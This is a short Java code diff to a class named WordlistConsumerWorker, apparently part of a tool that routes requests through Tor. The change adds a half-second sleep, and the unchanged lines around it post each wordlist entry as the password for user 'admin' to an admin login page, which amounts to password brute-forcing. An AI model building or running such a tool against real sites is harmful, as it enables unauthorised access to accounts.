@@ -26,6 +26,14 @@ public class WordlistConsumerWorker extends TorWorker
     public void process(String entry)
     {
         System.out.println("Entry: "+entry);
+        try
+        {
+            Thread.sleep(500);
+        }
+        catch (InterruptedException e)
+        {
+            e.printStackTrace();
+        }
         if (true) {return; }
         String page = TorRangeHttpHelper.postRequest("https://ccffdd/admin/login.php","username=admin&password="+entry+"&Submit=Login",getProxy() , false,"");
         if (page == null )
